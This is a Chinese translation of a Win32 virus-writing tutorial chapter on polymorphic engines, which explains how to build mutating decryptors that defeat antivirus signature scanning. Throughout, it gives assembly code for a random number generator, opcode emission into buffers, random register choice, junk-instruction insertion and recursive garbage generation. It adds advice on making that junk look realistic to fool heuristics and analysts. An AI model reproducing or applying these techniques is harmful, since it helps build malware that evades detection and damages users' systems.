

# Billy Belceb 病毒编写教程 for Win32 

> 原文：[`www.pediy.com/kssd/pediy06/pediy657810.htm`](https://www.pediy.com/kssd/pediy06/pediy657810.htm)

【Win32 多态(Win32 polymorphism)】  
\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
    许多人对我说，在我的 MS-DOS 病毒教程中最大的弱点是多态那一章(btw，我是在 15 岁的时候写的它，我知道汇编仅仅 1 个月)。但是基于这个原因，我将试图另外写一个，全新的，从 0 开始。从那时起我读了许多多态的文档，而且毫无疑问，对我影响最大的是 Qozah 的，虽然它非常简单，他解释了我们在编写一个多态引擎(如果你想读它，从病毒站点下载 DDT#1)更应该清楚的所有概念。我将在这一章里提到真正最基础的东西，所以如果你已经有这方面的基础知识了，跳过去!  
  
%介绍%  
\~~~~~~  
    多态存在的主要原因是，总是和反病毒软件的存在相关的。在那个没有多态引擎的时代，反病毒软件通过简单地使用一个扫描字符串来检测病毒，它们最困难地是加密了地病毒。所以，一个病毒编写者有了一个天才的想法。我敢肯定他在想“为什么我不编写一个不可扫描的病毒呢，这是通过技术来实现？”然后，多态诞生了。多态意味着在一个加了密的病毒中包括解密部分之内，排除所有可能的恒定不变的字节来避免被扫描。是的，多态意味着为病毒建立变化的解密程序。呵呵，简单而有效。这是基本的概念：永远不要建立两个一样(在外观上)的解密程序，但是总是能完成相同的功能。它好像是加密的自然扩展，但是因为加密代码还不是足够短，它们可以通过一个字符串来抓住，但是，利用多态，字符串就没有用了。  
  
%多态级别%  
\~~~~~~~~~~  
    每个级别的多态都有它自己的名字，是由反病毒者给的。让我们用 AVPVE 的一小段来看看它(好样的，Eugene)。  
  
\-----------------------------------------  
  
    根据这些病毒的解密代码的复杂性，对于多态病毒有一个分级系统。这个系统是由 Dr. Alan Solomon 提出然后由 Vesselin Bontchev 改进的。  
  
第 1 级：病毒有一些不变的解密代码集合，在感染的时候会选择一个。这种病毒被叫做"semi-polymorphic"或者"oligomorphic"。  
  
例子："Cheeba", "Slovakia", "Whale"。  
  
第 2 级：病毒解密程序包含一个或几个不变的指令，其它的都是改变的。  
  
第 3 级：解密程序有没有用的函数－“垃圾”如 NOP, CLI, STI,等等。  
  
第 4 级：解密程序使用可互换的指令并改变它们的顺序(指令混合)。解密算法保持不变。  
  
第 5 级：上述提到的所有技术都用到了，解密算法也是可变的，重复加密病毒代码甚至部分地加密解密程序本身代码也是可能的。  
  
第 6 级：交换病毒。病毒的主要代码以改变为条件进行改变，在感染的时候随机的分成了记过部分。尽管那样，病毒还是能继续工作。这样的病毒可能没有加密。  
  
    这样的分类仍然有缺点，因为主要标准是在病毒标志的惯例技术的帮助下根据解密程序的代码来检测病毒的可能性：  
  
第 1 级：为了检测病毒是否足够有一些标志  
  
第 2 级：通过使用“百搭牌(wild cards)”的帮助来检测病毒  
  
第 3 级：利用检测“垃圾”代码来检测病毒  
  
第 4 级：标志包含一些版本的可能代码，也就是算法  
  
第 5 级：使用标志不可能检测到病毒  
  
    这种分类在第 3 级的多态病毒，只是按照它这么叫的"第 3 级"就可以看出不足了。这个病毒是最复杂的多态病毒之一，根据当前的分类而到了第 3 级目录中了，因为它有一个不变的解密算法前面是大量的“垃圾”指令。然而，在这个病毒中“垃圾”产生算法几乎是完美的：在解密代码中可能会找到几乎所有的 i8086 指令。  
  
    如果病毒按照现在的反病毒观点来分到这个级别，使用自动解密病毒代码(模拟)系统，那么这个分类将会基于病毒代码的复杂性。其它病毒检测技术也是可能的，例如，在原始的数学规律的帮助下解密，等等。  
  
    因此，如果除了病毒标志线索外，其它的参数也考虑了，这个分类在我心目中的分类更客观。  
  
1.多态代码的复杂度(所有的处理指令在整个解密代码中占的比例)  
2.反模拟技术使用  
3.解密算法的恒定 chdu  
4.机密程序长度的恒定程度  
  
    我不想更详细的讨论这些了，因为结果是将会导致厉害的病毒编写者们创造出这种类型的怪物。  
  
\-----------------------------------------  
  
%我怎样来编写一个多态呢%  
\~~~~~~~~~~~~~~~~~~~~~~~~  
    首先，你必须在必须在你的脑海中清楚你想要使你的解密程序是什么样。例如：  
  
        mov     ecx,virus\_size  
        lea     edi,pointer\_to\_code\_to\_crypt  
        mov     eax,crypt\_key  
 @@1:   xor     dword ptr \[edi\],eax  
        add     edi,4  
        loop    @@1  
  
    那是一个非常简单的例子，是吗？我们这里主要有 6 块(每个指令是一块)。想象一下你使得那个代码不一样有多少种可能性呢：  
  
\- 改变寄存器  
\- 改变头 3 个指令的顺序  
\- 为了达到同样的目的使用不同的指令  
\- 插入什么也不做的指令  
\- 插入垃圾等等。  
  
    这是多态的主要思想。让我们看看对这个同样的解密程序，用一个简单的多态引擎初始的可能解密代码：  
  
        shl     eax,2  
        add     ebx,157637369h  
        imul    eax,ebx,69  
 (\*)    mov     ecx,virus\_size  
        rcl     esi,1  
        cli  
 (\*)    lea     edi,pointer\_to\_code\_to\_crypt  
        xchg    eax,esi  
 (\*)    mov     eax,crypt\_key  
        mov     esi,22132546h  
        and     ebx,0FF242569h  
 (\*)    xor     dword ptr \[edi\],eax  
        or      eax,34548286h  
        add     esi,76869678h  
 (\*)    add     edi,4  
        stc  
        push    eax  
        xor     edx,24564631h  
        pop     esi  
 (\*)    loop    00401013h  
        cmc  
        or      edx,132h  
        \[...\]  
  
    你明白了思想了没？对于一个病毒分析者来说，明白这样一个解密程序不是非常困难(对他们来说比一个没有加密的病毒要困难多了)。还可以做许多改进，相信我。我想你意识到了我们需要在我们的多态引擎中有不同的函数：一个用来为解密程序创造“合法”的指令，另外一个用来创造垃圾。这是你在编写一个多态引擎时必须有的主要主意。从这一点开始，我将尽可能的更好地解释这个。  
  
%非常重要地东西：RNG%  
\~~~~~~~~~~~~~~~~~~~~~  
    是的，在一个多态引擎中最重要的部分是随机数发生器(Random Number Generator)，即 RNG。一个 RNG 是一段能够返回一个彻底随机的数的代码。下面是 DOS 下的一个经典的程序，在 Win9X 下，甚至在 Ring-3 工作，但是不能在 NT 中工作。  
  
 random:  
        in      eax,40h  
        ret  
  
    这个将会在 EAX 的 MSW 中返回 0，LSW 中返回一个随机值。但是，这个不够强大...我们必须招另外一个...这得靠你了。这里我所能做的唯一一件事情是用一个小程序让你知道你的 RNG 是否强大。它在 Win32.Marburg(作者 GriYo/29A)的发作中也是由 GriYo 测试的这个病毒的 RNG。毫无疑问，这个代码被合适的修改了，这样可以被容易的编译和执行。  
  
;------从这里开始剪切-----------------------------------------------------------------  
;  
; RNG Tester  
; ==========  
;  
; 如果屏幕上的图标是真正的被“随机的”放置了，那么这个 RNG 就是一个不错的，但是如果如果图  
; 标是在屏幕的相同位置，或者你主意到图标在屏幕上有奇怪的行为，试试另外的 RNG。  
  
        .386  
        .model  flat  
  
res\_x   equ     800d                            ; Horizontal resolution  
res\_y   equ     600d                            ; Vertical resolution  
  
extrn   LoadLibraryA:PROC                       ; All the APIs needed by the  
extrn   LoadIconA:PROC                          ; RNG tester  
extrn   DrawIcon:PROC  
extrn   GetDC:PROC  
extrn   GetProcAddress:PROC  
extrn   GetTickCount:PROC  
extrn   ExitProcess:PROC  
  
        .data  
  
szUSER32        db      "USER32.dll",0          ; USER32.DLL ASCIIz string  
  
a\_User32        dd      00000000h               ; Variables needed  
h\_icon          dd      00000000h  
dc\_screen       dd      00000000h  
rnd32\_seed      dd      00000000h  
rdtsc           equ     <dw 310Fh>  
  
        .code  
  
RNG\_test:  
        xor     ebp,ebp                         ; Bah, i am lazy and i havent  
                                                ; removed indexations of the  
                                                ; code... any problem?  
  
        rdtsc  
        mov     dword ptr \[ebp+rnd32\_seed\],eax  
  
        lea     eax,dword ptr \[ebp+szUSER32\]  
        push    eax  
        call    LoadLibraryA  
  
        or      eax,eax  
        jz      exit\_payload  
  
        mov     dword ptr \[ebp+a\_User32\],eax  
  
        push    32512  
        xor     edx,edx  
        push    edx  
        call    LoadIconA  
        or      eax,eax  
        jz      exit\_payload  
  
        mov     dword ptr \[ebp+h\_icon\],eax  
  
        xor     edx,edx  
        push    edx  
        call    GetDC  
        or      eax,eax  
        jz      exit\_payload  
        mov     dword ptr \[ebp+dc\_screen\],eax  
  
        mov     ecx,00000100h                   ; Put 256 icons in the screen  
  
loop\_payload:  
  
        push    eax  
        push    ecx  
        mov     edx,eax  
        push    dword ptr \[ebp+h\_icon\]  
        mov     eax,res\_y  
        call    get\_rnd\_range  
        push    eax  
        mov     eax,res\_x  
        call    get\_rnd\_range  
        push    eax  
        push    dword ptr \[ebp+dc\_screen\]  
        call    DrawIcon  
        pop     ecx  
        pop     eax   
        loop    loop\_payload  
  
exit\_payload:  
        push    0  
        call    ExitProcess  
  
; RNG - This example is by GriYo/29A (see Win32.Marburg)  
;  
; For test the validity of your RNG, put its code here ;)  
;  
  
random  proc  
        push    ecx                               
        push    edx                               
        mov     eax,dword ptr \[ebp+rnd32\_seed\]  
        mov     ecx,eax  
        imul    eax,41C64E6Dh  
        add     eax,00003039h  
        mov     dword ptr \[ebp+rnd32\_seed\],eax  
        xor     eax,ecx  
        pop     edx  
        pop     ecx  
        ret  
random  endp  
  
get\_rnd\_range proc  
        push    ecx  
        push    edx  
        mov     ecx,eax  
        call    random  
        xor     edx,edx  
        div     ecx  
        mov     eax,edx    
        pop     edx  
        pop     ecx  
        ret  
get\_rnd\_range endp  
  
end     RNG\_test  
  
;------到这里为止剪切-----------------------------------------------------------------  
  
    它很有意思，至少对我来说是这样的，为了看看不同数学操作的作用。  
  
 % 多态引擎的基本概念 %  
\~~~~~~~~~~~~~~~~~~~~~~~~  
    我想你应该知道我将要解释什么了，所以，如果你已经编写了一个多态引擎，或者你知道怎么创建一个，我肯定建议你跳过这一段，或者你将开始谴责我的愚蠢，这是我不想要的。  
  
    首先，我们将要在一个临时缓冲去通常是堆里产生代码，但是也可以很容易地利用 VirtualAlloc 或者 GlobalAlloc API 函数来开辟内存。我们只是把一个指针指向这个缓冲内存区域地开始，而且这个寄存器通常是 EDI，因为通过使用 STOS 类地指令可以优化。所以我们要在这块内存缓冲里放置操作码字节。Ok,ok，如果你仍然认为我很糟因为我总是举一些代码例子来解释东西，我将表明你错了。  
  
;------从这里开始剪切-----------------------------------------------------------------  
;  
; Silly PER basic demonstrations (I)  
;  哪哪哪哪哪哪哪哪哪哪哪哪哪哪哪哪馁  
;  
  
        .386                                    ; Blah  
        .model  flat  
  
        .data  
  
shit:  
  
buffer  db      00h  
  
        .code  
  
Silly\_I:  
  
        lea     edi,buffer                      ; Pointer to the buffer  
        mov     al,0C3h                         ; Byte to write, in AL  
        stosb                                   ; Write AL content where EDI  
                                                ; points  
        jmp     shit                            ; As the byte we wrote, C3,  
                                                ; is the RET opcode, we fi-  
                                                ; nish the execution.  
  
end     Silly\_I  
  
;------到这里为止剪切-----------------------------------------------------------------  
  
    编译上面地代码，看看发生了什么。呵？我知道它不是什么事情也没做。但是你看到了，你产生了代码，不是直接编写的，而且我给你表明了你从 0 开始初始代码，并想想可能性，你可以从一个什么也没有的缓冲区里面初始一整个有用的代码。这是多态引擎代码(不是多态引擎产生的代码)怎样初始解密代码的基本概念。所以，想象一下我们要编写如下的指令：  
  
        mov     ecx,virus\_size  
        mov     edi,offset crypt  
        mov     eax,crypt\_key  
 @@1:   xor     dword ptr \[edi\],eax  
        add     edi,4  
        loop    @@1  
  
    那么，从上面的代码产生的解密程序将会这样：  
  
        mov     al,0B9h                         ; MOV ECX,imm32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,virus\_size                  ; The imm32 to store  
        stosd                                   ; Store EAX where EDI points  
        mov     al,0BFh                         : MOV EDI,offset32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,offset crypt                ; Offset32 to store  
        stosd                                   ; Store EAX where EDI points  
        mov     al,0B8h                         ; MOV EAX,imm32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,crypt\_key                   ; Imm32 to store  
        stosd                                   ; Store EAX where EDI points  
        mov     ax,0731h                        ; XOR \[EDI\],EAX opcode  
        stosw                                   ; Store AX where EDI points  
        mov     ax,0C783h                       ; ADD EDI,imm32 (>7F) opcode  
        stosw                                   ; Store AX where EDI points  
        mov     al,04h                          ; Imm32 (>7F) to store  
        stosb                                   ; Store AL where EDI points  
        mov     ax,0F9E2h                       ; LOOP @@1 opcode  
        stosw                                   ; Store AX where EDI points  
  
    OK，然后你已经产生了它应该是什么模样的代码，但是你意识到了在真正的代码中加一些什么也不做的指令非常简单，通过使用同样的方法。你可以用一个字节的指令实验一下，例如，看看它的兼容能力。  
  
;------从这里开始剪切-----------------------------------------------------------------  
;  
; Silly PER basic demonstrations (II)  
; ===================================  
;  
  
        .386                                    ; Blah  
        .model  flat  
  
virus\_size      equ     12345678h               ; Fake data  
crypt           equ     87654321h  
crypt\_key       equ     21436587h  
  
        .data  
  
        db      00h  
  
        .code  
  
Silly\_II:  
  
        lea     edi,buffer                      ; Pointer to the buffer  
                                                ; is the RET opcode, we fi-  
                                                ; nish the execution.  
  
        mov     al,0B9h                         ; MOV ECX,imm32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,virus\_size                  ; The imm32 to store  
        stosd                                   ; Store EAX where EDI points  
  
        call    onebyte  
  
        mov     al,0BFh                         ; MOV EDI,offset32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,crypt                       ; Offset32 to store  
        stosd                                   ; Store EAX where EDI points  
  
        call    onebyte  
  
        mov     al,0B8h                         ; MOV EAX,imm32 opcode  
        stosb                                   ; Store AL where EDI points  
        mov     eax,crypt\_key  
        stosd                                   ; Store EAX where EDI points  
  
        call    onebyte  
  
        mov     ax,0731h                        ; XOR \[EDI\],EAX opcode  
        stosw                                   ; Store AX where EDI points  
  
        mov     ax,0C783h                       ; ADD EDI,imm32 (>7F) opcode  
        stosw                                   ; Store AX where EDI points  
        mov     al,04h                          ; Imm32 (>7F) to store  
        stosb                                   ; Store AL where EDI points  
  
        mov     ax,0F9E2h                       ; LOOP @@1 opcode  
        stosw                                   ; Store AX where EDI points  
  
        ret  
  
random:  
        in      eax,40h                         ; Shitty RNG  
        ret  
  
onebyte:  
        call    random                          ; Get a random number  
        and     eax,one\_size                    ; Make it to be \[0..7\]  
        mov     al,\[one\_table+eax\]              ; Get opcode in AL  
        stosb                                   ; Store AL where EDI points  
        ret         
  
one\_table       label byte                      ; One-byters table  
        lahf  
        sahf  
        cbw  
        clc  
        stc  
        cmc  
        cld  
        nop  
one\_size        equ     ($-offset one\_table)-1  
  
buffer  db      100h dup (90h)                  ; A simple buffer  
          
end     Silly\_II  
  
;------到这里为止剪切-----------------------------------------------------------------  
  
    呵呵，我建立了一个很弱的 3 级，比 2 级强一些的多态引擎:)寄存器交换将在后面解释，因为它随着操作码格式变。但是我在这个小子章节里的目标达到了：你现在应该知道了我们想要做什么。想象一下你使用两个字节而不是一个字节，如 PUSH REG/POP REG, CLI/STI, 等等。  
  
%“真正”代码产生%  
\~~~~~~~~~~~~~~~~~~  
    让我们再看看我们的指令。  
  
        mov     ecx,virus\_size                  ; (1)  
        lea     edi,crypt                       ; (2)  
        mov     eax,crypt\_key                   ; (3)  
 @@1:   xor     dword ptr \[edi\],eax             ; (4)  
        add     edi,4                           ; (5)  
        loop    @@1                             ; (6)  
  
    为了达到同样的目的，但是用不同的代码，许多事情可以做，而且这是我们的目标。例如，前 3 个指令可以以其它的顺序排列，而且结果不会改变，所以你可以创建一个使它们的顺序随机的函数。而且我们可以使用其它的寄存器，没有任何问题。而且我们可以使用一个 dec/jnz 来取代一个 loop...等，等，等...  
  
\- 你的代码应该能够产生，例如，如下的能够处理一个简单指令，让我们想象一下，第一个 mov:  
  
        mov     ecx,virus\_size  
  
 或者  
  
        push    virus\_size  
        pop     ecx  
  
 或者  
  
        mov     ecx,not (virus\_size)  
        not     ecx  
  
 或者  
  
        mov     ecx,(virus\_size xor 12345678h)  
        xor     ecx,12345678h  
  
 等, 等, 等...  
  
    所有这些事情可以产生不同的操作码，而且完成同样的工作，也就是说，把病毒的大小放到 ECX 中。毫无疑问，有大量的可能性，因为你可以使用一个使用大量的指令来仅仅把一个值放到一个寄存器中。从你的角度它需要许多想象力。  
  
\- 另外一件事情是指令的顺序。正如我以前评论的，你可以很容易地没有任何问题地改变指令地顺序，因为对它们来说，顺序不重要。所以，例如，取代指令 1，2，3，我们可以使它成为 3，1，2 或者 1，3，2 等等。只要让你的想象力发挥作用即可。  
  
\- 同样重要的是，交换寄存器，因为每个操作码也改变了(例如，MOV EAX,imm32 被编码成 B8 imm32 而 MOV ECX,imm32 编码成 B9 imm32)。你应该为解密程序从 7 个寄存器中使用 3 个寄存器(千万不要使用 ESP!!!)。例如，想象一下我们选择(随机)3 个寄存器，EDI 作为基指针，EBX 作为密钥而 ESI 作为计数器；然后我们可以使用 EAX, ECX, EDX 和 EBP 作为垃圾寄存器来产生垃圾指令。让我们来看看关于选 3 个寄存器来对解密程序产生的代码：  
  
\---------------------------------------  
 InitPoly       proc  
  
 @@1:   mov     eax,8                           ; Get a random reg  
        call    r\_range                         ; EAX := \[0..7\]  
  
        cmp     eax,4                           ; Is ESP?   
        jz      @@1                             ; If it is, get another reg  
  
        mov     byte ptr \[ebp+base\],al          ; Store it  
        mov     ebx,eax                         ; EBX = Base register  
  
 @@2:   mov     eax,8                           ; Get a random reg  
        call    r\_range                         ; EAX := \[0..7\]  
  
        cmp     eax,4                           ; Is ESP?  
        jz      @@2                             ; If it is, get another one  
  
        cmp     eax,ebx                         ; Is equal to base pointer?  
        jz      @@2                             ; If it is, get another one  
  
        mov     byte ptr \[ebp+count\],al         ; Store it  
        mov     ecx,eax                         ; ECX = Counter register  
  
 @@3:   mov     eax,8                           ; Get random reg  
        call    r\_range                         ; EAX := \[0..7\]  
  
        cmp     eax,4                           ; Is it ESP?  
        jz      @@3                             ; If it is, get another one  
  
        cmp     eax,ebx                         ; Is equal to base ptr reg?  
        jz      @@3                             ; If it is, get another reg  
  
        cmp     eax,ecx                         ; Is equal to counter reg?  
        jz      @@3                             ; If it is, get another one  
  
        mov     byte ptr \[ebp+key\],al           ; Store it  
  
        ret  
  
 InitPoly       endp  
  
\------------------------------------  
    现在，你在 3 个不同的寄存器中有 3 个变量，我们可以自由地没有任何问题地使用。对于 EAX 寄存器我们有一个问题，不是非常重要，但是确实是一个问题。正如你所知道的，EAX 寄存器有，在某些指令中，一个优化操作码。这不是一个问题，因为代码得到了同样的执行，但是启发将会发现一些代码是以一个不正确的方式建立的，一种一个"真正"汇编不会用的的方法。你有两种选择：如果你仍然想使用 EAX,例如，作为你的代码中的"活跃"的寄存器，你应该检查它，如果能够优化它，或者简单的避免在解密程序中使用 EAX 寄存器作为"active"寄存器，并只是把它用来做垃圾，直接使用它的优化操作码(把它们建一个表将是一个很伟大的选择)。我们将在后面看到。我推荐使用一个标志寄存器，为了最终的垃圾游戏:)  
  
%垃圾的产生%  
\~~~~~~~~~~~~  
    在质量中，垃圾的质量 90%决定了你的多态引擎的质量。是的，我说的是“质量”而非你所想的“数量”。首先，我将列出你在编写一个多态引擎时的两个选择：  
  
\- 产生现实代码，以合法的应用代码面目出现。例如，GriYo 的引擎。  
  
\- 产生尽可能多的代码，以一个破坏的文件面目出现。例如，Mental Driller 的  MeDriPoLen(看看 Squatter)。  
  
    Ok,让我们开始吧：  
  
?两个的共同点:  
  
\- 用很多不同方式调用(调用中嵌调用再嵌调用...)  
\- 无条件的跳转  
  
?现实主义：  
  
    一些现实的东西是那些看起来真实的东西，虽然它并不是。对于这个我打算解释如下：如果你看到大量的没有 CALL 和 JUMP 的代码你会怎么想？如果在一个 CMP 后面没有一个条件跳转你会怎么想？它几乎是不可能的，正如你，我和反病毒者知道的。所以我们必须有能力产生所有这些类型的垃圾结构：  
  
 - CMP/条件跳转  
 - TEST/条件跳转  
 - 如果对 EAX 处理，总是使用优化的指令  
 - 使用内存访问  
 - 产生 PUSH/垃圾/POP 结构  
 - 产生非常少的只要一个字节的代码(如果有)  
  
?精神摧毁...恩...象破坏代码:  
  
    这个当解密程序充满了无意义的操作码看起来不像代码的时候发生，也就是说不符合以前列出来的规则的代码，而且使用协处理器的不做任何事情的指令，当然了，使用的操作码越多越好。  
  
 -=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?  
  
    现在，我将试图解释代码产生的所有要点。首先，让我们以和它们相关的所有东西开始，CALL 和无条件跳转。  
  
?首先一点，CALL，它非常简单。你可以做成调用子例程，通过许多方式：  
  
 |Figure 1 -------|       |Figure 2 -------|       |Figure 3 -------|  
 |     call   @@1 |       |     jmp    @@2 |       |     push   @@2 |  
 |     ...        |       |     ...        |       |     ...        |  
 |     jmp    @@2 |       |@@1:            |       |@@1:            |  
 |     ...        |       |     ...        |       |     ...        |  
 |@@1:            |       |     ret        |       |     ret        |  
 |     ...        |       |     ...        |       |     ...        |  
 |     ret        |       |@@2:            |       |@@2:            |  
 |     ...        |       |     ...        |       |     ...        |  
 |@@2:            |       |     call   @@1 |       |     call   @@1 |  
 |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|       |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|       |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|  
  
   当然你可以把所有的都混合起来，而且结果是，你有许多方式在一个解密程序内部编写一个子例程。而且，毫无疑问，你可以反过来(你将会听到我对它提更多的次数)，而且可能在另外的 CALL 里有 CALL，所有这些又在另外一个 CALL 里，然后另外一个...真的非常头疼。  
  
   此外，存储这些子例程的偏移并在产生的代码的任何地方调用它将是一个很好的选择。  
  
?关于非条件跳转，它非常简单，因为我们不必要关心在 jump 之后知道 jump 的范围的指令，我们可以插入完全随机的操作码，比如垃圾...  
  
 -=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?  
  
    现在，我打算代码中的现实主义。GriYo 可以被称为这种类型的引擎的最伟大的代表；如果你看到了他的 Marburg 引擎, 或者他的 HPS 引擎，你将会意识到那个，虽然它的简易，他试图使得代码看起来尽可能真实，而且这个使得反病毒者在获得一个可靠的对付它的算法之前都快疯了。OK，让我们以一些基本要点开始:  
  
 ?关于 'CMP/条件 jump' 结构，它相当清晰，因为你不放一个条件跳转，将从不会使用一个比较...OK，但是要编不是 0 跳转的 jump，也就是说，在条件跳转和它应该跳转(或者不跳转)的偏移之间产生一些可执行的垃圾，而且在分析者的眼中，这些代码将更少地被怀疑。  
  
 ?和 TEST 一样，但是使用 JZ 或者 JNZ，因为正如你知道地,TEST 仅仅会对 zero flag 有影响。  
  
 ?最有可能制造失败的是 AL/AX/EAX 寄存器，因为它们有它们自己的优化代码。你将得到下面的指令的例子：  
  
 ADD, OR, ADC, SBB, AND, SUB, XOR, CMP 和 TEST (和寄存器很紧密).  
  
 ?关于内存访问，一个好的选择是至少要获得被感染的 PE 文件的 512 字节数据，把它们放到病毒的某处，然后访问它们，读或协。试着使用除了简单的指数，双精度数，而如果你的大脑能接受它，试着使用双指数相乘，例如\[ebp+esi\*4\]。并不是你想的那么困难，相信我。你还可以做一些内存移动，用 MOVS 指示，还可以使用 STOS, LODS, CMPS...所有的字符串操作也可以使用。这就靠你了。  
  
 ?PUSH/垃圾/POP 结构非常有用，因为它的加到引擎中的简单，还因为好的效果，因为它在一个合法程序中是一个非常普通的结构。  
  
 ?一个字节的指令的数量，如果太多了，会暴露我们的存在给反病毒者，或者给那些有着好奇的眼睛的家伙。考虑普通程序不是很正常使用它们，所以最好作一个检测来避免过多的使用它们，但是仍然每 25 字节使用一两个(我认为这是一个不错的比率)。  
  
 -=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?-=?  
  
   下面是一些精神摧毁型的东西:)  
  
?你可以使用，例如，下面两个字节的协处理器指令是没有任何类型问题的垃圾：  
  
 f2xm1, fabs, fadd, faddp,  fchs, fnclex, fcom, fcomp, fcompp, fcos, fdecstp,  
 fdiv, fdivp,  fdivr, fdivrp,  ffree,  fincstp,  fld1, fldl2t, fldl2e, fldpi,  
 fldln2,  fldz, fmul, fmulp,  fnclex, fnop,  fpatan,  fprem,  fprem1,  fptan,  
 frndint, fscale, fsin, fsincos, fsqrt, fst, fstp, fsub, fsubp, fsubr,fsubrp,  
 ftst, fucom, fucomp, fucompp, fxam, fxtract, fyl2x, fyl2xp1.  
  
    只要在病毒的开始放这两个指令来重置协处理器:  
  
        fwait  
        fninit  
  
    Mental Driller 现在正偏向于现实主义了(据我所知)由他的最近的令人印象深刻的引擎(TUAREG)，所以...  
  
 % 指令建立 %  
\~~~~~~~~~~~~~~  
    这大概是和多态相关的最重要的事情了:关系在相同指令和不同寄存器之间存在，或者在两个相同家族的指令之间存在。如果我们把指变成二进制的话它们之间的关系就非常清晰了。但是，因此，一些有用的信息:  
  
 寄存器二进制形式 | 000 001 010 011 100 101 110 111  
                  | -------------------------------  
 Byte 寄存器      | AL  CL  DL  BL  AH  CH  DH  BH  
 Word 寄存器      | AX  CX  DX  BX  SP  BP  SI  DI  
 扩展寄存器       | EAX ECX EDX EBX ESP EBP ESI EDI  
 段               | ES  CS  SS  DS  FS  GS  --  --  
 MMX 寄存器       | MM0 MM1 MM2 MM3 MM4 MM5 MM6 MM7      
  
    我认为在写我的《Virus Writing Guides for MS-DOS》时候，所犯的大错误是在我的解释 OpCodes 结构部分，和所有那些东西。这里我想要描述的是许多"你自己做"，就像我在写一个多态引擎时那样。只以一个 XOR 操作码为例...  
  
        xor     edx,12345678h -> 81 F2 78563412  
        xor     esi,12345678h -> 81 F6 78563412  
  
    你看到了不同了吗?我习惯利用一个调试器，然后写我想要用一些寄存器构造代码，看看有什么改变。OK，正如你能看到的(嗨!你没瞎吧?)，改变的字节是第二个。现在是有趣的部分了:把值变成二进制形式。  
  
        F2 -> 11 110 010  
        F6 -> 11 110 110  
  
    OK，你看到了什么改变了吗?最后 3 个 bit，对吗?好了，现在到我把寄存器以二进制表示的部分:)正如你已经发现的，这 3 个 bit 根据寄存器的改变而改变了。所以...  
  
        010 -> EDX 寄存器  
        110 -> ESI 寄存器  
  
    只要试着把那 3 个比特赋其它的二进制值，你将会发现寄存器是怎么改变的。但是要小心...不要使用用这个操作码 EAX 值(000)，因为，所有的算术指令，都对 EAX 优化了，因此要彻底地改变操作码。  
  
    所以，调试所有你想要的构造，看看它们之间的关系，并建立产生任何东西的可靠的代码。它非常简单!  
  
 % Recursivity %  
\~~~~~~~~~~~~~~~~~  
    它在你的多态引擎中是一个非常重要的一点。recursivity 必须有一个限度，但是依赖于那个限度，代码可以非常难理解(如果那个限度很高)。让我们想象一些有一个所有垃圾代码构造器的偏移表:  
  
 PolyTable:  
        dd      offset (GenerateMOV)  
        dd      offset (GenerateCALL)  
        dd      offset (GeneratteJMP)  
        \[...\]  
 EndPolyTable:  
  
    并想象一下你有在它们之中选择的如下例程:  
  
 GenGarbage:  
        mov     eax,EndPolyTable-PolyTable  
        call    r\_range  
        lea     ebx,\[ebp+PolyTable\]  
        mov     eax,\[ebx+eax\*4\]  
        add     eax,ebp  
        call    eax  
        ret  
  
    现在想象一下你的'GenerateCALL'指令从内部调用'GenGarbage'例程。呵呵'GenGarbage'可以再次调用'GenerateCALL'，并再次，然后再次(取决于 RNG)，所以你将有 CALL 在 CALL 中在 CALL 中...我已经在那件事情之前提了一个限度仅仅是为了避免速度问题，但是它可以用这些新的  
'GenGarbage'例程来解决:  
  
 GenGarbage:  
        inc     byte ptr \[ebp+recursion\_level\]  
        cmp     byte ptr \[ebp+recursion\_level\],05 ; <- 5 is the recursion   
        jae     GarbageExit                       ;    level here!  
  
        mov     eax,EndPolyTable-PolyTable  
        call    r\_range  
        lea     ebx,\[ebp+PolyTable\]  
        mov     eax,\[ebx+eax\*4\]  
        add     eax,ebp  
        call    eax  
  
 GarbageExit:  
        dec     byte ptr \[ebp+recursion\_level\]  
        ret  
   
    所以，我们的引擎将能产生巨大数量的充满这种 CALL 的垃圾代码;)当然了，这个还可以在 PUSH 和 POP 间利用:)  
  
%最后的话%  
\~~~~~~~~~~  
    多态性决定了编码，所以我不更多的讨论了。你应该自己做一个而不是复制代码。只要不是对经典引擎用一种类型的简单加密操作，和非常基础的垃圾如 MOV，等等。使用你可以想到的所有主意。例如，有许多类型的 CALL 可做:3 种风格(正如我以前描述的)，此外，你可以建立堆栈结构，PUSHAD/POPAD，通过 PUSH(然后是一个 RET x)来传送参数，还有更多的。要有想象力!

 4dd466d0e1e0cc123afbe504da2462ca